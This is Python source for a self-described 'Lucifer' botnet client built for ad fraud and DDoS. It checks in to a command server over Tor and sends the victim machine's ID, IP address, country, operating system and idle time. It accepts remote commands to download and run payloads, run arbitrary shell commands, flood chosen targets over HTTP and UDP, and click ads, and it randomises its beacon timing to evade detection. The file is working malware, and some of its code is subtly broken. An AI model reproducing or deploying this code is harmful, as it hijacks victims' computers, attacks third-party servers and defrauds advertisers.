# Lucifer Botnet Client
# Ad - Fraud  &&  DDoS
# Hail The Onion Router

import subprocess
import time
import zipfile
import sys
import os
import thread
import threading
import platform
import string
import random
import uuid
import glob
import requests
import socks

import settings
import morningstar
import ddos
import download
import click
import torhack

prefix = '[ > ] '
newline = '[ - ] '
prefucked = '[ x ] '

print prefix + "Lucifer Botnet Client"
print newline
print prefix + 'Waiting to start...'

exename = str(sys.argv[0].split('\\')[-1])

useragents = ["Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0",
"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53",
"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53"]

headers = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\\Cookie: disclaimer_accepted=true"
headers = headers.split("\r\n")

useragent = random.choice(useragents)
cookies = dict(disclaimer_accepted='true')

s = requests.Session()
s.headers.update({'User-Agent': useragent})

output = ''

if "Linux" == settings.ostype():
	killcmd = 'killall'
else:
	killcmd = 'taskkill'

#### Idle Detection #########################################################################

if settings.ostype() == "Windows":
	from _winreg import *
	from ctypes import Structure, windll, c_uint, sizeof, byref

	class LASTINPUTINFO(Structure):
	    _fields_ = [
	        ('cbSize', c_uint),
	        ('dwTime', c_uint),
	    ]

	def get_idle_duration():
	    lastInputInfo = LASTINPUTINFO()
	    lastInputInfo.cbSize = sizeof(lastInputInfo)
	    windll.user32.GetLastInputInfo(byref(lastInputInfo))
	    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
	    return millis / 1000.0
else:
	def get_idle_duration():
		return 666

#### Botstuff ###############################################################################

# Randomizes the knocktime to avoid being so fucking botlike
def waitmod(time):
	modby = time / 3
	start = time - modby
	stop = time + modby
	time = random.randint(start, stop)
	return time

# Handles commands from the server
def botman(output):
	global knocktime
	global username
	try:
		d = output.split("!")
		i = d[1].split(" ")
		o = string.replace(output, i[0] + ' ', '')
		command = i[0].replace("!", "")
		print prefix + command + " received."
		if command == 'knocktime':
			knocktime = int(i[1])
		if command == 'update':
			download().update(i[1], i[2])
		if command == 'download':
			download().download(i[1], i[2])
		if command == 'downloadexec':
			download().downloadexec(i[1], i[2])
		if command == 'terminal':
			os.popen(o)
		if command == 'get':
			dosman('get', i[1], i[2], i[3], i[4])
		if command == 'slowget':
			dosman('getslow', i[1], i[2], i[3], i[4])
		if command == 'udp':
			dosman('udp', i[1], i[2], i[3], i[4])
		if command == 'udplag':
			dosman('udplag', i[1], i[2], i[3], i[4])
		if command == 'click':
			thread.start_new_thread(settings.clickad, (i[1], useragent))
		return True
	except: 
		return False

# Handles DoS attack commands
def dosman(method, victim, port, dostime, threads):
	dostime = int(dostime) + time.time()
	print prefix + method + ' started @ ' + victim + ':' + str(port)
	for x in range(int(threads)):
		if method == 'get':
			thread.start_new_thread(ddos.getdos, (victim, port, dostime))
		elif method == 'getslow':
			thread.start_new_thread(ddos.getslowdos, (victim, port, dostime))
		elif method == 'udp':
			thread.start_new_thread(ddos.udpdos, (victim, port, dostime, 1024))
		elif method == 'udplag':
			thread.start_new_thread(ddos.udplagdos, (victim, port, dostime, 1024))
		print prefix + 'New thread started'

# Gets the ID of the bot
def getid():
	try:
		if ostype() == "Windows":
			botid = glob.glob(os.getenv('appdata') + '/' + "*.cfg")
			botid = botid.split("/")[-1]
		else:
			botid = glob.glob("*.cfg")
			botid = botid.split("/")[-1]
		botid = botid[0].replace(".cfg", "")
	except: botid = ""
	if botid == "":
		try:
			botid = str(uuid.uuid4())
			if settings.ostype() == "Windows":
				newself = open(os.getenv('appdata') + '/' + botid + ".cfg", "w")
			else:
				newself = open(botid + ".cfg", "w")
			newself.close()
			print prefix + 'Wrote config file'
		except:
			print prefix + "ID is fucked"
	return botid

def getcountry():
    if getip() == 'Unknown':
        return 'Unknown'
    else:
        try:
            return s.get('http://api.wipmania.com/' + getip()).text
        except:
            return 'Unknown'
 
def getip():
    try:
        return s.get('http://bot.whatismyipaddress.com/').text
    except:
        return 'Unknown'

# http://stackoverflow.com/questions/12886768/how-to-unzip-file-in-python-on-all-oses
def unzip(source_filename, dest_dir):
	with zipfile.ZipFile(source_filename) as zf:
		zf.extractall(dest_dir)

#### Start ##################################################################################

time.sleep(settings.connectwait())

myid = getid()
print newline
print prefix + "BOT ID:\t\t\t" + myid
myip = getip()
print prefix + "IP ADDRESS:\t\t" + myip
mycountry = getcountry()
print prefix + "COUNTRY:\t\t\t" + mycountry
postos = platform.system() + ' ' + platform.release()
print prefix + "OPERATING SYSTEM:\t" + postos
print newline

knocktime = settings.knocktime()

if settings.ostype() == "Windows":
	morningstar.watchman().start()
	thread.start_new_thread(morningstar.startup, ())

	self = os.path.realpath(sys.argv[0])
	print prefix + self
	try:
		if os.path.exists(tordir + '\Tor\\tor.exe'):
			thread.start_new_thread(os.popen, (tordir + '\Tor\\tor.exe', ))
	except:
		print prefix + 'Could not start Tor. May be forced to use fallback mode.'


while 1:
	try:
		torhack.setProxy(type=socks.PROXY_TYPE_SOCKS5, host='127.0.0.1', port=9050)
		# Set to fallback and replace if needed
		url = "https://" + settings.onions().split(".")[0] + "." + settings.proxies() + "/core.php"
		try:
			if torhack.checkTor():
				url = "http://" + settings.onions() + ":80/core.php"
		except:
			torhack.unsetProxy()
			
		
		print prefix + "Connecting to " + url

		output = s.post(url, {'id': myid, 'version': settings.version(), 'os': postos, 'ip': myip, 'country': mycountry, 'idle': get_idle_duration()}, verify=False, cookies=cookies)
		torhack.unsetProxy()

		output = output.text
		print prefix + output

		if botman(output) != True:
			print prefix + 'Invalid response from server.'
		thistime = waitmod(knocktime)
		print prefix + 'Sleeping for ' + str(thistime)
		time.sleep(thistime)
		print newline
	except:
		print prefix + 'Server connection failed.'
